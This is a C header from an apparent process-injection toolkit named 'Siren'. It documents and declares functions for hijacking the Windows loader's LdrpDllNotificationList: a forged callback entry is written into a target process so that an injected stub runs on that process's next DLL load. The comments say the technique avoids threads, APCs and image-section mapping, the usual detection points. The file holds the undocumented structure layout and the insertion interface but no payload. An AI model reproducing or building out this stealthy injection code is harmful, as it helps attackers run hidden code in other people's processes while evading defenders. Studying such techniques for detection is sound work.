/*
 * src/notify/ldr_notify.h
 *
 * LdrpDllNotificationList hijacking — the core execution trigger of
 * the Siren technique.
 *
 * The Windows loader maintains an internal doubly-linked list of
 * notification callbacks (LDR_DLL_NOTIFICATION_ENTRY).  On every DLL
 * load or unload the loader iterates this list and calls each
 * registered callback in the context of the loading thread.
 *
 * By inserting a forged entry at the head of the list we cause our
 * stub to execute the next time the target process loads any DLL —
 * without spawning a thread, queuing an APC, or mapping a SEC_IMAGE
 * section.
 */

#ifndef SIREN_LDR_NOTIFY_H
#define SIREN_LDR_NOTIFY_H

#include "siren/siren_status.h"

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * In-memory layout of an LDR_DLL_NOTIFICATION_ENTRY.
 * Undocumented but stable since Windows Vista.
 */
typedef struct siren_ldr_notify_entry {
    LIST_ENTRY List;      /* Flink / Blink (doubly-linked) */
    PVOID      Callback;  /* → our stub inside the slack space */
    PVOID      Context;   /* → section handle (HANDLE cast to PVOID) */
} siren_ldr_notify_entry;

/*
 * siren_notify_find_list_head
 *
 * Locate LdrpDllNotificationList inside ntdll.dll loaded in THIS process,
 * then return the equivalent address in hProcess (same ntdll build).
 *
 * Strategy: call LdrRegisterDllNotification in the injector, read the
 * Blink of the returned cookie to get the list head, compute offset from
 * ntdll base, apply to target's ntdll base.
 *
 * out_list_head — address of LdrpDllNotificationList inside hProcess
 */
siren_status_t siren_notify_find_list_head(HANDLE   hProcess,
                                           void   **out_list_head);

/*
 * siren_notify_insert
 *
 * Write a forged siren_ldr_notify_entry at entry_addr_in_target and
 * patch LdrpDllNotificationList to insert it at the head.
 *
 * entry_addr_in_target — pre-allocated address in target (end of stub blob)
 * stub_addr_in_target  — address of the PIC stub (start of blob)
 * section_handle       — handle value of the PE section inside hProcess
 */
siren_status_t siren_notify_insert(HANDLE hProcess,
                                   void  *entry_addr_in_target,
                                   void  *stub_addr_in_target,
                                   HANDLE section_handle);

#ifdef __cplusplus
}
#endif

#endif /* SIREN_LDR_NOTIFY_H */
